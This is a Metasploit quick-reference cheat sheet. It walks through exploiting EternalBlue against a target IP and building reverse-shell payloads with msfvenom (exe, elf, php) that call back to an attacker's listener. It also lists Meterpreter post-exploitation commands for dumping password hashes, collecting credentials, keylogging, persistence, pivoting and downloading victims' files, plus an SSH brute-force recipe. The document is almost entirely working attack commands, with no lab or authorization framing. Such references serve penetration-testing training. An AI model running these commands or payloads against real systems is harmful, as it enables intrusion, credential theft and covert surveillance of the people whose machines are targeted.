# 💣 Metasploit Quick Reference

> The world's most used exploitation framework. Learn this.

---

## Start Metasploit

```bash
msfconsole          # Start (takes ~30 seconds)
msfconsole -q       # Start without banner (faster)
```

---

## Core Commands

```bash
help                        # Show all commands
search <term>               # Search for exploits/modules
use <module path>           # Load a module
info                        # Info about loaded module
show options                # Show required settings
show payloads               # Show compatible payloads
set <OPTION> <value>        # Set an option
run  OR  exploit            # Execute the module
back                        # Go back to main menu
exit                        # Quit Metasploit
```

---

## Finding Exploits

```bash
search type:exploit name:eternalblue
search type:exploit platform:windows
search cve:2021-44228
search ms17-010
search wordpress
```

---

## Basic Exploit Workflow

```bash
# 1. Find the exploit
search eternalblue

# 2. Load it
use exploit/windows/smb/ms17_010_eternalblue

# 3. See what's needed
show options

# 4. Set the target
set RHOSTS 192.168.1.10

# 5. Set your IP (for reverse shell)
set LHOST 192.168.1.5

# 6. Run it
exploit
```

---

## Payloads

```bash
# Show payloads for current module
show payloads

# Common payloads
set payload windows/x64/meterpreter/reverse_tcp    # Windows — best
set payload linux/x86/meterpreter/reverse_tcp      # Linux
set payload windows/meterpreter/reverse_https      # Encrypted (harder to detect)
set payload generic/shell_reverse_tcp              # Basic shell, no meterpreter

# Generate standalone payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php
```

---

## Meterpreter Commands (after getting a shell)

```bash
# System info
sysinfo              # OS, hostname, arch
getuid               # Current user
getpid               # Process ID
ps                   # List processes

# Navigation
pwd                  # Current directory
ls                   # List files
cd <path>            # Change directory
cat <file>           # Read file
download <file>      # Download file to attacker
upload <file>        # Upload file to victim

# Privilege escalation
getsystem            # Try to get SYSTEM
getprivs             # Show privileges

# Persistence
run persistence -h   # Persist across reboots

# Pivoting
run autoroute -s 192.168.2.0/24   # Add route to internal network

# Dump credentials
hashdump             # Dump Windows password hashes
run post/windows/gather/credentials/credential_collector

# Screenshots & keylogging
screenshot           # Take screenshot
keyscan_start        # Start keylogger
keyscan_dump         # Dump keys captured
keyscan_stop         # Stop keylogger

# Escalate shell
shell                # Drop into system shell
background           # Background session (Ctrl+Z also works)
sessions -l          # List all sessions
sessions -i 1        # Resume session 1
```

---

## Listeners (catch reverse shells)

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run -j              # Run as background job
```

---

## Useful Post-Exploitation Modules

```bash
# Windows
use post/windows/gather/hashdump
use post/windows/gather/credentials/credential_collector
use post/multi/recon/local_exploit_suggester    # Find local privesc

# Linux
use post/linux/gather/hashdump
use post/multi/recon/local_exploit_suggester

# Network
use post/multi/gather/ping_sweep
use auxiliary/scanner/portscan/tcp
```

---

## Auxiliary Modules (no exploit needed)

```bash
# Port scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445
run

# SMB enum
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_ms17_010      # Check EternalBlue

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS IP
set USER_FILE /usr/share/wordlists/users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Vulnerability scanning
use auxiliary/scanner/http/dir_scanner
```

---

## Database (save scan results)

```bash
# Start postgresql first
service postgresql start
msfdb init

# In msfconsole
db_status
db_nmap -sV -p- 192.168.1.10    # Nmap scan saved to DB
hosts                             # Show discovered hosts
services                          # Show discovered services
vulns                             # Show found vulnerabilities
```
